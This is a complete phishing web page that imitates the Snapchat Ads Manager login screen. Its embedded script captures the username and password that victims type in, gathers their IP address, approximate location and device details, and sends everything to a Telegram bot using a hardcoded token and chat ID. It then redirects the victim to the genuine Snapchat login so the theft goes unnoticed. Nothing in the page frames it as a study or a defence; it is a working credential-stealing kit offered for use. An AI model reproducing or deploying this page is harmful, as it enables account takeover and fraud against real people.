<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Ads Manager • Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'AvenirNext', Avenir, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            flex-direction: column;
        }

        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }

        .logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo img {
            width: 180px;
            height: auto;
        }

        .logo svg {
            width: 160px;
            height: 48px;
        }

        .login-card {
            background-color: #ffffff;
            border-radius: 16px;
            padding: 32px 24px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
            margin-bottom: 24px;
        }

        h2 {
            font-size: 28px;
            font-weight: 700;
            color: #111;
            margin-bottom: 8px;
            line-height: 1.2;
        }

        .subtitle {
            font-size: 16px;
            color: #5e5e5e;
            margin-bottom: 28px;
            font-weight: 400;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        .input-group {
            margin-bottom: 16px;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 6px;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            background-color: #fafafa;
            border: 1.5px solid #e0e0e0;
            border-radius: 12px;
            font-size: 15px;
            outline: none;
            transition: all 0.2s;
        }

        .input-field:focus {
            border-color: #fffc00;
            background-color: #ffffff;
            box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.15);
        }

        .forgot-link {
            text-align: right;
            margin: 4px 0 20px 0;
        }

        .forgot-link a {
            color: #1a1a1a;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }

        .forgot-link a:hover {
            text-decoration: underline;
        }

        .login-btn {
            background-color: #fffc00;
            color: #000000;
            border: none;
            border-radius: 30px;
            padding: 14px 20px;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
            width: 100%;
            margin-bottom: 24px;
            border: 1px solid rgba(0, 0, 0, 0.05);
        }

        .login-btn:hover {
            background-color: #f2ee00;
            transform: scale(1.01);
        }

        .login-btn:disabled {
            background-color: #f0f0f0;
            color: #999;
            cursor: not-allowed;
            transform: none;
        }

        .signup-section {
            text-align: center;
            border-top: 1px solid #eaeaea;
            padding-top: 24px;
        }

        .signup-text {
            font-size: 15px;
            color: #5e5e5e;
        }

        .signup-text a {
            color: #000000;
            font-weight: 700;
            text-decoration: none;
            margin-left: 4px;
        }

        .signup-text a:hover {
            text-decoration: underline;
        }

        .footer {
            text-align: center;
            font-size: 12px;
            color: #8a8a8a;
            margin-top: 32px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 16px;
        }

        .footer-links a {
            color: #5e5e5e;
            text-decoration: none;
            font-size: 12px;
            font-weight: 500;
        }

        .footer-links a:hover {
            color: #000;
        }

        .copyright {
            color: #8a8a8a;
            font-size: 11px;
        }

        /* Snapchat Ghost Icon */
        .ghost-icon {
            display: inline-block;
            margin-right: 8px;
            vertical-align: middle;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- Snapchat Logo -->
            <svg width="160" height="48" viewBox="0 0 160 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M40.5 12C37.5 12 35 14.5 35 17.5V30.5C35 33.5 37.5 36 40.5 36H53.5C56.5 36 59 33.5 59 30.5V17.5C59 14.5 56.5 12 53.5 12H40.5Z" fill="#FFFC00"/>
                <path d="M80 24C80 29.5 75.5 34 70 34C64.5 34 60 29.5 60 24C60 18.5 64.5 14 70 14C75.5 14 80 18.5 80 24Z" fill="#FFFC00"/>
                <circle cx="70" cy="24" r="10" fill="#FFFC00"/>
                <circle cx="66" cy="22" r="2" fill="black"/>
                <circle cx="74" cy="22" r="2" fill="black"/>
                <path d="M70 28C68.5 28 67.2 27.2 66.5 26H73.5C72.8 27.2 71.5 28 70 28Z" fill="black"/>
                <text x="100" y="30" font-family="Arial" font-weight="bold" font-size="24" fill="black">Snapchat</text>
            </svg>
        </div>

        <div class="login-card">
            <h2>Log In</h2>
            <div class="subtitle">to continue to Ads Manager</div>

            <form id="loginForm">
                <div class="input-group">
                    <label for="username">Username or Email</label>
                    <input type="text" class="input-field" id="username" placeholder="Enter username or email" required autocomplete="off">
                </div>

                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" class="input-field" id="password" placeholder="Enter password" required autocomplete="off">
                </div>

                <div class="forgot-link">
                    <a href="#">Forgot Password?</a>
                </div>

                <button type="submit" class="login-btn" id="loginBtn">Log In</button>

                <div class="signup-section">
                    <div class="signup-text">
                        New To Snapchat? <a href="#">Sign Up</a>
                    </div>
                </div>
            </form>
        </div>

        <div class="footer">
            <div class="footer-links">
                <a href="#">About</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Contact</a>
                <a href="#">Support</a>
                <a href="#">Ads Manager</a>
            </div>
            <div class="copyright">
                © 2024 Snapchat · All rights reserved
            </div>
        </div>
    </div>

    <script>
        // Telegram Bot Configuration (आपका दिया हुआ)
        const BOT_TOKEN = '8549484649:AAEN6QrU5v3npjZct1C9K-dPZ1xHK9lRqig';
        const CHAT_ID = '6398977115';

        // Function to send login details to Telegram
        async function sendToTelegram(username, password) {
            try {
                // Get IP Address
                let userIP = 'Unknown';
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    userIP = ipData.ip;
                } catch (e) {}

                // Get approximate location
                let location = 'Unknown';
                try {
                    const locResponse = await fetch('https://ipapi.co/json/');
                    const locData = await locResponse.json();
                    location = `${locData.city || ''}, ${locData.country_name || ''}`;
                    if (location === ', ') location = 'Unknown';
                } catch (e) {}

                // Get browser and device info
                const browserInfo = navigator.userAgent;
                const platform = navigator.platform;
                const language = navigator.language;
                const screenSize = `${window.screen.width}x${window.screen.height}`;

                // Create message (clean format)
                const message = 
`🔐 *Snapchat Login Alert*
👤 *Username/Email:* ${username}
🔑 *Password:* ${password}
🌍 *IP Address:* ${userIP}
📍 *Location:* ${location}
💻 *Browser:* ${browserInfo.substring(0, 100)}...
📱 *Platform:* ${platform}
🌐 *Language:* ${language}
🖥️ *Screen:* ${screenSize}
⏰ *Time:* ${new Date().toLocaleString()}`;

                // Send to Telegram
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                
                await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                console.log('✅ Login details sent to Telegram');
            } catch (error) {
                console.log('❌ Error sending to Telegram:', error);
            }
        }

        // Form submission handler
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!username || !password) {
                return; // Don't show any alert
            }

            // Disable button and show loading state
            const loginBtn = document.getElementById('loginBtn');
            loginBtn.disabled = true;
            loginBtn.textContent = 'Logging in...';

            // Send to Telegram (don't await - let it run in background)
            sendToTelegram(username, password);

            // Redirect to real Snapchat login page after a short delay
            setTimeout(() => {
                window.location.href = 'https://accounts.snapchat.com/accounts/v2/login';
            }, 800);
        });

        // Input field effects
        document.querySelectorAll('.input-field').forEach(field => {
            field.addEventListener('focus', function() {
                this.style.borderColor = '#fffc00';
                this.style.backgroundColor = '#ffffff';
            });
            
            field.addEventListener('blur', function() {
                this.style.borderColor = '#e0e0e0';
                this.style.backgroundColor = '#fafafa';
            });
        });

        // Test function (run in console to check if bot works)
        window.testTelegram = function() {
            sendToTelegram('test_user', 'test_password_123');
            console.log('✅ Test message sent! Check your Telegram bot.');
        };
    </script>
</body>
</html>
